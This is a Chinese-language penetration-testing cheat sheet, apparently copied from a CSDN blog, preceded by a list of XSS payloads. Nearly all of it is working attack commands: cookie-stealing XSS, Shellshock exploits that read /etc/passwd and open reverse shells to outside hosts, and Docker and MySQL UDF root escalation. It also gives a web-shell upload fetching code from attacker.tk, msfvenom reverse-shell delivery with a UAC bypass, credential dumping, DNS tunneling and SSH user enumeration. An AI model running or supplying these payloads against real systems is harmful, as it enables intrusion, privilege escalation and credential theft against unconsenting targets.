<IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>
<IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
<IMG SRC="jav ascript:alert('XSS');">
perl -e 'print "<IMG SRC=javascript:alert(\"XSS\")>";' > out
<BODY onload!#> $%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>
(">< iframes http://google.com < iframes >)
<BODY BACKGROUND="javascript:alert('XSS')">
<FRAMESET><FRAME SRC=”javascript:alert('XSS');"></FRAMESET>
"><script >alert(document.cookie)</script>
%253cscript%253ealert(document.cookie)%253c/script%253e
"><s"%2b"cript>alert(document.cookie)</script>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E
<img src=asdf onerror=alert(document.cookie)>
SSH Over SCTP (使用 Socat)
# 远端服务器
# 假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP
> $ socat SCTP-LISTEN:80,fork TCP:localhost:22
# 本地端
# 将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号
> $ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80
# 创建 socks 代理
# 替换 username 和 -p 的端口号
> $ ssh -lusername localhost -D 8080 -p 1337
使用洋葱网络
# 安装服务
> $ apt-get install tor torsocks
# 绑定 ssh 到 tor 服务端口 80
# /etc/tor/torrc
SocksPolicy accept 127.0.0.1
SocksPolicy accept 192.168.0.0/16
Log notice file /var/log/tor/notices.log
RunAsDaemon 1
HiddenServiceDir /var/lib/tor/ssh_hidden_service/
HiddenServicePort 80 127.0.0.1:22
PublishServerDescriptor 0
> $ /etc/init.d/tor start
> $ cat /var/lib/tor/ssh_hidden_service/hostname
3l5zstvt1zk5jhl662.onion
# ssh 客户端连接
> $ apt-get install torsocks
> $ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80
Metagoofil – 元数据收集工具
注：Metagoofil 是一款利用Google收集信息的工具。
# http://www.edge-security.com/metagoofil.php
# 它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能
> $ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html
利用 Shellshock
# 一个发现并利用服务器 Shellshock 的工具
# https://github.com/nccgroup/shocker
> $ ./shocker.py -H 192.168.56.118  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
# 查看文件
> $ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \> $(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80
# 绑定 shell
> $ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80
# 反弹 Shell
> $ nc -l -p 443
> $ echo "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80
获取 Docker 的 Root
# 获取  Docker 的 Root
# user 必须在 docker 用户组中
ek@victum:~/docker-test> $ id
uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)
ek@victum:~> $ mkdir docker-test
ek@victum:~> $ cd docker-test
ek@victum:~> $ cat > Dockerfile
FROM debian:wheezy
ENV WORKDIR /stuff
RUN mkdir -p > $WORKDIR
VOLUME [ > $WORKDIR ]
WORKDIR > $WORKDIR
<< EOF
ek@victum:~> $ docker build -t my-docker-image .
ek@victum:~> $ docker run -v > $PWD:/stuff -t my-docker-image /bin/sh -c \
'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh'
./sh
whoami
# root
ek@victum:~> $ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c 'cat /stuff/shadow'
使用 DNS 隧道绕过防火墙
# 让数据和命令使用 DNS 隧道传输以绕过防火墙的检查
# dnscat2 支持从目标主机上面上传和下载命令来获取文件、数据和程序
# 服务器 (攻击者)
> $ apt-get update
> $ apt-get -y install ruby-dev git make g++
> $ gem install bundler
> $ git clone https://github.com/iagox86/dnscat2.git
> $ cd dnscat2/server
> $ bundle install
> $ ruby ./dnscat2.rb
dnscat2> New session established: 16059
dnscat2> session -i 16059
# 客户机 (目标)
# https://downloads.skullsecurity.org/dnscat2/
# https://github.com/lukebaggett/dnscat2-powershell
> $ dnscat --host <dnscat server_ip>
编译 Assemble 代码
> $ nasm -f elf32 simple32.asm -o simple32.o
> $ ld -m elf_i386 simple32.o simple32
> $ nasm -f elf64 simple.asm -o simple.o
> $ ld simple.o -o simple
使用非交互 Shell 打入内网
# 生成 shell 使用的 ssh 密钥
> $ wget -O - -q "http://domain.tk/sh.php?cmd=whoami"
> $ wget -O - -q "http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \"\" "
> $ wget -O - -q "http://domain.tk/sh.php?cmd=cat /tmp/id_rsa"
# 增加用户 tempuser 
> $ useradd -m tempuser
> $ mkdir /home/tempuser/.ssh && chmod 700 /home/tempuser/.ssh
> $ wget -O - -q "http://domain.tk/sh.php?cmd=cat /tmp/id_rsa" > /home/tempuser/.ssh/authorized_keys
> $ chmod 700 /home/tempuser/.ssh/authorized_keys
> $ chown -R tempuser:tempuser /home/tempuser/.ssh
# 反弹 ssh shell
> $ wget -O - -q "http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@<attacker_ip>"
利用 POST 远程命令执行获取 Shell
attacker:~> $ curl -i -s -k  -X 'POST' --data-binary > $'IP=%3Bwhoami&submit=submit' 'http://victum.tk/command.php'
attacker:~> $ curl -i -s -k  -X 'POST' --data-binary > $'IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&submit=submit' 'http://victum.tk/command.php'
attacker:~> $ curl http://victum.tk/shell.php?cmd=id
# 在服务器上下载 shell (phpshell.php)
http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27
# 运行 nc 并执行 phpshell.php
attacker:~> $ nc -nvlp 1337
以管理员身份在 Win7 上反弹具有系统权限的 Shell
msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe > danger.exe
# 显示账户配置
net user <login>
# Kali 上下载 psexec
https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx
# 使用 powershell 脚本上传 psexec.exe 到目标机器
echo > $client = New-Object System.Net.WebClient > script.ps1
echo > $targetlocation = "http://192.168.56.102/PsExec.exe" >> script.ps1
echo > $client.DownloadFile(> $targetlocation,"psexec.exe") >> script.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1
# 使用 powershell 脚本上传 danger.exe 到目标机器
echo > $client = New-Object System.Net.WebClient > script2.ps1
echo > $targetlocation = "http://192.168.56.102/danger.exe" >> script2.ps1
echo > $client.DownloadFile(> $targetlocation,"danger.exe") >> script2.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1
# 使用预编译的二进制文件绕过 UAC:
https://github.com/hfiref0x/UACME
# 使用 powershell 脚本上传 https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe 到目标机器
echo > $client = New-Object System.Net.WebClient > script2.ps1
echo > $targetlocation = "http://192.168.56.102/Akagi64.exe" >> script3.ps1
echo > $client.DownloadFile(> $targetlocation,"Akagi64.exe") >> script3.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1
# 在 Kali 上创建监听
nc -lvp 4444
# 以系统权限使用 Akagi64 运行 danger.exe 
Akagi64.exe 1 C:\Users\User\Desktop\danger.exe
# 在 Kali 上创建监听
nc -lvp 4444
# 下一步就会反弹给我们一个提过权的 shell
# 以系统权限使用 PsExec 运行 danger.exe 
psexec.exe –i –d –accepteula –s danger.exe
以普通用户身份在 Win7 上反弹具有系统权限的 Shell
https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051
https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html
https://www.exploit-db.com/exploits/37049/
# 查找目标机器是否安装了补丁，输入如下命令
wmic qfe get
wmic qfe | find "3057191"
# 上传编译后的利用程序并运行它
https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe
# 默认情况下其会以系统权限执行 cmd.exe，但我们需要改变源代码以运行我们上传的 danger.exe
# https://github.com/hfiref0x/CVE-2015-1701 下载它并定位到 "main.c"
# 使用 wce.exe 获取已登录用户的明文账号密码
http://www.ampliasecurity.com/research/windows-credentials-editor/
wce -w
# 使用 pwdump7 获取其他用户的密码哈希值
http://www.heise.de/download/pwdump.html
# we can try online hash cracking tools such crackstation.net
MS08-067 – 不使用 Metasploit
> $ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205
> $ searchsploit ms08-067
> $ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1
通过 MySQL Root 账户实现提权
# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
> $ wget 0xdeadbeef.info/exploits/raptor_udf2.c
> $ gcc -g -c raptor_udf2.c
> $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/user/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
mysql> select do_system('echo "root:passwd" | chpasswd > /tmp/out; chown user:user /tmp/out');
user:~> $ su -
Password:
user:~# whoami
root
root:~# id
uid=0(root) gid=0(root) groups=0(root)
使用 LD_PRELOAD 注入程序
> $ wget https://github.com/jivoi/pentest/ldpreload_shell.c
> $ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so
> $ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft
针对 OpenSSH 用户进行枚举时序攻击
注：枚举时序攻击(“Enumeration Timing Attack”)属于侧信道攻击/旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。–参考自 shotgun 在知乎上的解释。
osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。
# https://github.com/c0r3dump3d/osueta
> $ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes
> $ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt
使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道
注： ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。
对了亲～ReDuh-Gui 号称端口转发神器哦。
# https://github.com/sensepost/reDuh
# 步骤 1
# 上传 reDuh.jsp 目标服务器
> $ http://192.168.10.50/uploads/reDuh.jsp
# 步骤 2
# 在本机运行 reDuhClient 
> $ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp
# 步骤 3
# 使用 nc 连接管理端口
> $ nc -nvv 127.0.0.1 1010
# 步骤 4
# 使用隧道转发本地端口到远程目标端口
[createTunnel] 7777:172.16.0.4:3389
# 步骤 5
# 使用 RDP 连接远程
> $ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777

来自 <http://blog.csdn.net/ru_li/article/details/51536233> 
